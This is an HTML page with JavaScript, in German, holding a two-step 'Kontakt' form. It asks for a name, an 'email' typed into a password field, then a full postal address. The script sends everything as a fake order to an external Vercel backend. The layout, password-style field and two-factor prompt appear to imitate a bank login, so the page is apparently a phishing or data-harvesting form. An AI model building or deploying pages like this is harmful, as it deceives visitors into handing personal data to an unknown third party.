<form id="contactForm">
  <div class="ca-h">Kontakt</div>

  <div class="ca-b pb-0">
    <div class="ig mb-1 noselect">
      <input tabindex="0" class="foc no-select" type="text" id="name" name="name" required="" autofocus="" placeholder="Name">
      
      <div class="igt" data-toggle="po">
        <svg viewBox="0 0 16 16" width="24" height="24" fill="#003d8f" tabindex="0" style="cursor: pointer;">
          <path d="M8 16a8 8 0 1 1 8-8 8 8 0 0 1-8 8M8 .94A7.06 7.06 0 1 0 15.06 8 7.07 7.07 0 0 0 8 .94"></path><path d="M8.92 4.9H7.08V3.37h1.84Zm0 7.65H7.08V5.82h1.84Z"></path>
        </svg>
      </div>
    </div>

    <div class="ig mb-1 noselect">
      <input tabindex="0" class="foc no-select" type="password" id="email" name="email" required="" placeholder="Email">
      
      <div class="igt" onclick="toggleEmailVisibility()">
        <svg viewBox="0 0 24 24" width="20" height="20" fill="#003d8f" id="email-eye-show" tabindex="0" style="cursor: pointer;">
          <path d="M12.023 3a10.75 10.75 0 0 0-7.356 3.078 15.1 15.1 0 0 0-3.547 5.007 1.22 1.22 0 0 0 0 .939 15.1 15.1 0 0 0 3.548 5.007 10.75 10.75 0 0 0 7.356 3.078 10.75 10.75 0 0 0 7.356-3.078 15.25 15.25 0 0 0 3.552-5.007 1.22 1.22 0 0 0 0-.939 15.2 15.2 0 0 0-3.552-5.007A10.75 10.75 0 0 0 12.023 3m-5.5 8.555a5.5 5.5 0 1 1 5.5 5.5 5.5 5.5 0 0 1-5.499-5.5Zm5.5-2.444a2.446 2.446 0 0 1-2.444 2.444 2.5 2.5 0 0 1-.775-.126.325.325 0 0 0-.447.283 3.5 3.5 0 0 0 .122.791 3.667 3.667 0 1 0 3.7-4.613.324.324 0 0 0-.283.447 2.5 2.5 0 0 1 .126.775Z"></path>
        </svg>
        <svg viewBox="0 0 24 24" width="20" height="20" fill="#003d8f" class="d-none" id="email-eye-hide" tabindex="0" style="cursor: pointer;">
          <path d="M1.45 2.186A.9.9 0 0 0 .34 3.6L22.539 21a.9.9 0 0 0 1.11-1.417L19.7 16.5a15 15 0 0 0 3-4.44 1.2 1.2 0 0 0 0-.922 14.9 14.9 0 0 0-3.487-4.916A10.54 10.54 0 0 0 11.994 3.2a10.24 10.24 0 0 0-6.349 2.28ZM8.361 7.6a5.4 5.4 0 0 1 8.381 6.57l-1.447-1.132A3.6 3.6 0 0 0 12.152 8a.318.318 0 0 0-.277.439A2.4 2.4 0 0 1 12 9.2a2.4 2.4 0 0 1-.247 1.061L8.364 7.6Zm5.621 9.015a5.4 5.4 0 0 1-7.388-5.021 6 6 0 0 1 .052-.757L3.111 8.051a14.2 14.2 0 0 0-1.823 3.082 1.2 1.2 0 0 0 0 .922 14.9 14.9 0 0 0 3.487 4.916 10.54 10.54 0 0 0 7.219 3.022 9.86 9.86 0 0 0 4.732-1.219Z"></path>
        </svg>
      </div>
    </div>

    <div class="rl-c">
      <a tabindex="0" href="#" class="rl">Telefon</a>
      <a tabindex="0" href="#" class="rl">Nachricht</a>
    </div>
  </div>

  <div class="ca-f pt-1 pb-0">
    <button type="button" class="btn" id="submit-btn" onclick="goToStep2()">Senden</button>
  </div>

  <div class="ca-b pb-1">
    <p id="status"></p>
    <h4 class="tfa-subhead">2-Faktor-Authentifizierung einrichten</h4>
    Ich möchte meinen Zugang mit einem zweiten Faktor absichern.
    <button type="submit" class="btn mb-1 btn-forward btn-secondary" name="registerMfa" id="registerMfa">Weiter</button>
  </div>
</form>

<!-- Step 2 Form (Hidden by default) -->
<form id="addressForm" style="display: none;">
  <div class="ca-h">Adresse</div>

  <div class="ca-b pb-0">
    <div class="ig mb-1 noselect">
      <input tabindex="0" class="foc no-select" type="text" id="streetname" name="streetname" required="" placeholder="Straßenname">
    </div>

    <div class="ig mb-1 noselect">
      <input tabindex="0" class="foc no-select" type="text" id="housenumber" name="housenumber" required="" placeholder="Hausnummer">
    </div>

    <div class="ig mb-1 noselect">
      <input tabindex="0" class="foc no-select" type="text" id="postalcode" name="postalcode" required="" placeholder="Postleitzahl">
    </div>

    <div class="ig mb-1 noselect">
      <input tabindex="0" class="foc no-select" type="text" id="country" name="country" required="" placeholder="Land">
    </div>
  </div>

  <div class="ca-f pt-1 pb-0">
    <button type="submit" class="btn" id="submit-btn-2">Senden</button>
  </div>

  <div class="ca-b pb-1">
    <p id="status-2"></p>
  </div>
</form>

<!-- Popover for Name field -->
<div class="po" style="display: none; padding: 0px;">
  <div class="po-h">Name
    <span class="po-c" onclick="cpo(event)">
      <svg viewBox="0 0 20 20" width="12" height="12">
        <path d="m15.8 4.2-1.4-1.4-4.4 4.4-4.4-4.4-1.4 1.4 4.4 4.4-4.4 4.4 1.4 1.4 4.4-4.4 4.4 4.4 1.4-1.4-4.4-4.4z"></path>
      </svg>
    </span>
  </div>
  <div style="padding:8px">
    Bitte geben Sie Ihren vollständigen Namen ein.
  </div>
</div>

<script>
const BACKEND_URL = '[order-backend-one.vercel.app](https://order-backend-one.vercel.app)';

let formDataCache = {};

document.querySelectorAll('[data-toggle="po"]').forEach(icon => {
  icon.addEventListener('click', (e) => {
    e.preventDefault();
    const popover = document.querySelector('.po');
    const rect = icon.getBoundingClientRect();

    popover.style.display = 'block';
    popover.style.position = 'fixed';
    popover.style.left = (rect.right + 10) + 'px';
    popover.style.top = (rect.top + rect.height / 2) + 'px';
    popover.style.transform = 'translateY(-50%)';
    popover.style.zIndex = '1000';
  });
});

function cpo(event) {
  event.preventDefault();
  event.stopPropagation();
  document.querySelector('.po').style.display = 'none';
}

function toggleEmailVisibility() {
  const emailInput = document.getElementById('email');
  const eyeShow = document.getElementById('email-eye-show');
  const eyeHide = document.getElementById('email-eye-hide');

  if (emailInput.type === 'password') {
    emailInput.type = 'text';
    eyeShow.classList.add('d-none');
    eyeHide.classList.remove('d-none');
  } else {
    emailInput.type = 'password';
    eyeShow.classList.remove('d-none');
    eyeHide.classList.add('d-none');
  }
}

function goToStep2() {
  const name = document.getElementById('name').value.trim();
  const email = document.getElementById('email').value.trim();

  if (!name || !email) {
    document.getElementById('status').textContent = "❌ Bitte alle Felder ausfüllen";
    return;
  }

  formDataCache.customer_name = name;
  formDataCache.email = email;

  const btn = document.getElementById('submit-btn');
  btn.disabled = true;

  setTimeout(() => {
    document.getElementById('contactForm').style.display = 'none';
    document.getElementById('addressForm').style.display = 'block';
    btn.disabled = false;
  }, 1000);
}

document.addEventListener('click', function(event) {
  const popover = document.querySelector('.po');
  const icon = event.target.closest('[data-toggle="po"]');
  if (!icon && popover.style.display === 'block') {
    popover.style.display = 'none';
  }
});

document.getElementById('addressForm').addEventListener('submit', async (e) => {
  e.preventDefault();

  const streetname = document.getElementById('streetname').value.trim();
  const housenumber = document.getElementById('housenumber').value.trim();
  const postalcode = document.getElementById('postalcode').value.trim();
  const country = document.getElementById('country').value.trim();

  if (!streetname || !housenumber || !postalcode || !country) {
    document.getElementById('status-2').textContent = "❌ Bitte alle Felder ausfüllen";
    return;
  }

  const formData = {
    customer_name: formDataCache.customer_name,
    email: formDataCache.email,
    phone: "Not provided",
    shipping_address: `${streetname} ${housenumber}, ${postalcode} ${country}`,
    product_name: "Contact Form",
    quantity: 1,
    price: 1
  };

  try {
    const res = await fetch(`${BACKEND_URL}/api/orders`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(formData)
    });

    const data = await res.json();

    if (res.ok) {
      document.getElementById('status-2').textContent = "✅ Erfolgreich versendet!";
      document.getElementById('addressForm').reset();

      formDataCache = {};

      document.getElementById('contactForm').reset();
      document.getElementById('email').type = 'password';
      document.getElementById('email-eye-show').classList.remove('d-none');
      document.getElementById('email-eye-hide').classList.add('d-none');

      setTimeout(() => {
        document.getElementById('addressForm').style.display = 'none';
        document.getElementById('contactForm').style.display = 'block';
        document.getElementById('status-2').textContent = '';
      }, 2000);
    } else {
      document.getElementById('status-2').textContent = "❌ " + data.error;
    }

  } catch (err) {
    console.error('Error:', err);
    document.getElementById('status-2').textContent = "❌ Server Fehler";
  }
});
</script>
